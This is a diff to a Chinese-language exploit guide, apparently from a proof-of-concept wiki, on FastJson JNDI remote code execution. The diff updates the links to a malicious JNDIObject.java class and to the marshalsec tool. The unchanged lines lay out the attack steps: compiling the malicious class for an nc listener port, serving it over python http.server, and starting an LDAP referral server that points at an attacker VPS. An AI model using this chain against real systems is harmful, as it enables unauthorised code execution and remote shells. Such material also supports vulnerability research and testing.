@@ -16,11 +16,12 @@
 
 ### 步骤二：准备要执行的 Java 恶意代码
 
-修改恶意类代码 [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) 并编译生成恶意类 JNDIObject.class
+修改恶意类代码 [JNDIObject.java](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/file/JNDIObject.java) 并编译生成恶意类 JNDIObject.class
 
 ```bash
 javac JNDIObject.java
 ```
+![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/image/javaCode.jpg)
 > ⚠️port为nc监听端口
 
 ### 步骤三：搭建http服务传输恶意文件
@@ -35,7 +36,7 @@ python3 -m http.server 80
 
 ### 步骤四：架设恶意类的 ldap 服务
 
-下载 [marshalsec](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/SpringBoot/jolokia%20logback%20JNDI%20RCE/marshalsec-0.0.3-SNAPSHOT-all.jar) ，使用下面命令架设对应的 ldap 服务：
+下载 [marshalsec](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发语言漏洞/JAVA/FsatJson/file/marshalsec-0.0.3-SNAPSHOT-all.jar) ，使用下面命令架设对应的 ldap 服务：
 
 ```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
